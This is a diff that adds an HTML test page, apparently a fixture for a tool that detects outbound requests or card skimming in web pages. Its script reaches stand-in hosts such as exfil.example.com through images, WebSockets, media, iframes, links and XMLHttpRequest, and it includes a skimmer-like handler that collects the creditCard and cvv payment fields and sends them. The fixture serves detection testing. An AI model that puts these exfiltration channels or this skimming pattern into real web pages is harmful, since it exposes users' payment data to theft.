@@ -1,0 +1,80 @@
+<!doctype html>
+<html>
+
+<head>
+</head>
+
+<body>
+  <div id="test">
+    <form>
+      <input type="text" name="secret">
+      <input type="password" name="superSecret">
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+</body>
+<script>
+  var moo = new Image()
+  moo.src = "image.png"
+
+  new FontFace('w', 'url(//foo.com/foo.woff)')
+
+  document.createElement('div').innerHTML = '<img src="http://exfil.example.com">'
+
+  new WebSocket("wss://exfil.example.com/", "exfil")
+
+  document.createElement('div').style.backgroundImage = 'url(http://exfil.example.com/foo.jpg)'
+
+  new Audio().src = "http://exfil.example.com"
+
+  document.createElement('audio').src = 'http://exfil.example.com'
+
+  document.createElement('video').src = 'http://exfil2.example.com'
+
+  document.createElement('img').src = 'http://exfil3.example.com'
+
+  document.createElement('iframe').src = 'http://exfil4.example.com'
+
+  document.createElement('link').href = 'http://exfil5.example.com'
+
+  document.getElementById('test').addEventListener('click', function () {
+    var foo = 'bar'
+  })
+
+  eval('var a = "foo"')
+
+  var foo = atob('123')
+
+  var bar = btoa(foo)
+
+  setTimeout(function () { var foo = 'bar'}, 1000)
+
+  window.onload = function () {
+    var d = document.getElementById('creditCard')
+    d.addEventListener('mouseup', function (e) {
+      var form = document.querySelector('payment')
+      var data = new FormData(form)
+      var req = new XMLHttpRequest()
+      req.send(data)
+    })
+    var badReq = new XMLHttpRequest()
+    badReq.open('GET', 'http://exfil6.example.com/foo')
+    badReq.send()
+  }
+
+  var z = document.createElement('link')
+  z.rel = 'preconnect'
+  z.href = '//foobar.google.com'
+
+</script>
+
+<div>
+  <form method="POST" id="payment">
+    <input type="text" id="creditCard" name="creditCard">
+    <input type="text" id="cvv" name="cvv">
+    <button type="submit">
+      Submit
+    </button>
+  </form>
+</div>
+</html>
